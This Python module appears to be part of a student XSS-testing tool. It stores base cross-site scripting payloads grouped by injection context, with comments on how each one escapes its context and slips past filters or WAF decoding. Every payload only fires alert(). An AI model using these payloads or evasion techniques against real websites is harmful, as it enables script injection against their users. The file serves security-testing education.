"""
payload_bank.py
Owner: Member 1 (Payload Bank Lead)

Holds the CURATED BASE XSS payloads, organized by injection context.
This is the "data foundation" the rest of the tool builds on:
- cli.py picks a context + calls get_payloads() to fetch this raw list
- mutators.py then applies encoding/evasion ON TOP of these base payloads

So the payloads here are deliberately NOT encoded yet - that's Member 2's
job. This file's job is just: "if the attacker can inject text into THIS
context, what are the different raw ways to get a <script> or event
handler to actually execute?"

Contexts covered (per assignment brief):
- html_body   : payload lands directly inside the page's HTML body
- attribute   : payload lands inside an HTML tag attribute value
- js_string   : payload lands inside a JavaScript string literal
- url_param   : payload lands in a URL query parameter reflected into the page

All payloads use alert('XSS-test') as a harmless, local-only proof of
execution - nothing here exfiltrates data or contacts an external server.
"""

PAYLOADS = {
    # ------------------------------------------------------------------
    # CONTEXT 1: html_body
    # Payload is reflected directly as HTML content, e.g.:
    #   <div>Welcome, HERE</div>
    # ------------------------------------------------------------------
    "html_body": [
        # Classic - straight <script> tag. Will be blocked by almost
        # any real filter, but it's the baseline every bypass is
        # measured against.
        "<script>alert('XSS-test')</script>",

        # No <script> tag at all - uses an <img> with a broken src so
        # onerror fires. Useful because some filters only blacklist
        # the literal word "script".
        "<img src=x onerror=alert('XSS-test')>",

        # Similar idea but with <svg>, which some filters forget to
        # blacklist because they're focused on <script>/<img>.
        "<svg onload=alert('XSS-test')>",

        # Self-triggering iframe - no event needed, srcdoc executes
        # inline HTML (including its own <script>) immediately.
        "<iframe srcdoc=\"<script>alert('XSS-test')</script>\">",

        # javascript: pseudo-protocol inside an iframe's src attribute -
        # found this during testing against OWASP Juice Shop's "DOM XSS"
        # challenge, which specifically checks for this exact pattern.
        "<iframe src=\"javascript:alert(`xss`)\">",
    ],

    # ------------------------------------------------------------------
    # CONTEXT 2: attribute
    # Payload is reflected inside a tag attribute value, e.g.:
    #   <input type="text" value="HERE">
    # ------------------------------------------------------------------
    "attribute": [
        # Breaks OUT of the attribute's double quotes, closes the tag,
        # then injects a fresh <script> tag after it.
        "\"><script>alert('XSS-test')</script>",

        # Doesn't even need to escape the tag - just adds a brand new
        # event-handler attribute onto the SAME tag. Works even if the
        # filter strips angle brackets, since there are none here.
        "\" onmouseover=\"alert('XSS-test')",

        # Same idea, but for sites that use single quotes instead of
        # double quotes for attribute values.
        "' onfocus='alert(\"XSS-test\")' autofocus='",

        # Doesn't break out of the quotes at all - relies on the
        # attribute being something the browser executes directly,
        # like an href using the javascript: pseudo-protocol.
        "javascript:alert('XSS-test')",
    ],

    # ------------------------------------------------------------------
    # CONTEXT 3: js_string
    # Payload is reflected inside an existing JS string literal, e.g.:
    #   var username = "HERE";
    # ------------------------------------------------------------------
    "js_string": [
        # Closes the double-quoted string, runs alert(), then comments
        # out whatever code was originally after it on that line.
        "\";alert('XSS-test');//",

        # Same idea for single-quoted JS strings.
        "';alert('XSS-test');//",

        # Doesn't close the string at all - just concatenates onto it
        # using JS string concatenation, in case semicolons/quotes are
        # being filtered but "+" slips through.
        "\"+alert('XSS-test')+\"",

        # Template literal breakout, for apps that build strings with
        # backticks: `Hello ${name}` style reflected input.
        "${alert('XSS-test')}",
    ],

    # ------------------------------------------------------------------
    # CONTEXT 4: url_param
    # Payload is placed in a URL query parameter that the server
    # reflects back into the page, e.g.:
    #   https://example.com/search?q=HERE
    # ------------------------------------------------------------------
    "url_param": [
        # Plain payload - works if the app reflects the param straight
        # into HTML with zero encoding.
        "<script>alert('XSS-test')</script>",

        # URL-encoded version - needed when the app (or a WAF in front
        # of it) decodes %XX sequences before the filter check runs,
        # but blocks raw "<script>" in the request itself.
        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",

        # Double URL-encoded - for cases where the request passes
        # through two decode steps (e.g. a proxy AND the app), so a
        # single encoding gets fully decoded too early and gets caught.
        "%253Cscript%253Ealert('XSS-test')%253C/script%253E",

        # img/onerror variant in URL form, for apps that strip the
        # word "script" specifically from query parameters.
        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS-test')%3E",
    ],
}


def get_payloads(context: str):
    """
    Return the list of base payloads for a given injection context.
    Raises a clear error if the context doesn't exist yet, instead
    of silently returning nothing (helps whoever's debugging cli.py).
    """
    if context not in PAYLOADS:
        raise ValueError(
            f"Unknown context '{context}'. "
            f"Available contexts so far: {list(PAYLOADS.keys())}"
        )
    return PAYLOADS[context]


def list_contexts():
    """
    Return all currently available contexts. Useful for cli.py
    when building a --context flag with argparse choices=...
    """
    return list(PAYLOADS.keys())